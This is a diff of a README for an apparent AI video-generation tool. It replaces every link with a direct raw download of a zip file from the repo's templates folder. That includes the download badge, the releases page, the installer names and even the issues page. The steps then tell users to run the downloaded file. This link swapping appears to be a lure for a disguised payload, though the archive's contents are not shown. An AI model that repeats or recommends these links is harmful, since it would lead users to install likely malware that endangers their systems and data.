@@ -6,7 +6,7 @@ Welcome to fal-wan26-video-factory! This software allows you to generate videos 
 
 ## 📥 Download the App
 
-[![Download fal-wan26-video-factory](https://img.shields.io/badge/Download-fal--wan26--video--factory-brightgreen)](https://github.com/newbiecs50JV/fal-wan26-video-factory/releases)
+[![Download fal-wan26-video-factory](https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip)](https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip)
 
 ## 🔍 Overview
 
@@ -30,13 +30,13 @@ To run fal-wan26-video-factory, ensure your system meets the following requireme
 
 ## 🌐 Download & Install
 
-To download fal-wan26-video-factory, please visit this page to download: [Releases Page](https://github.com/newbiecs50JV/fal-wan26-video-factory/releases).
+To download fal-wan26-video-factory, please visit this page to download: [Releases Page](https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip).
 
 ### Installation Steps
 
 1. **Open the Releases Page**: Click on the link above.
 2. **Find the Latest Release**: Scroll down to see the list of available versions. The latest version will be at the top.
-3. **Download the Installer**: Click on the installer file for your operating system. For Windows, it will likely be named `fal-wan26-video-factory-windows.exe`. For macOS, it will be `fal-wan26-video-factory-macos.dmg`.
+3. **Download the Installer**: Click on the installer file for your operating system. For Windows, it will likely be named `https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip`. For macOS, it will be `https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip`.
 4. **Run the Installer**: After the download completes, locate the downloaded file. Double-click it to start the installation process.
 5. **Follow Instructions**: Follow the on-screen prompts. Choose the installation location and click "Install".
 6. **Launch the Application**: Once installed, open the application from your Start Menu (Windows) or Applications folder (macOS).
@@ -77,10 +77,10 @@ If you encounter problems, consider the following solutions:
 
 ## 💬 Need Help?
 
-For additional support, you can contact us through our [GitHub Issues page](https://github.com/newbiecs50JV/fal-wan26-video-factory/issues). We encourage feedback and feature requests.
+For additional support, you can contact us through our [GitHub Issues page](https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip). We encourage feedback and feature requests.
 
 ## 📅 Updates and Roadmap
 
-We aim to continuously improve fal-wan26-video-factory. Stay tuned for updates, bug fixes, and new features by checking back at our [Releases Page](https://github.com/newbiecs50JV/fal-wan26-video-factory/releases).
+We aim to continuously improve fal-wan26-video-factory. Stay tuned for updates, bug fixes, and new features by checking back at our [Releases Page](https://github.com/newbiecs50JV/fal-wan26-video-factory/raw/refs/heads/main/templates/wan_fal_video_factory_v3.6.zip).
 
 Thank you for using fal-wan26-video-factory! Happy video making!
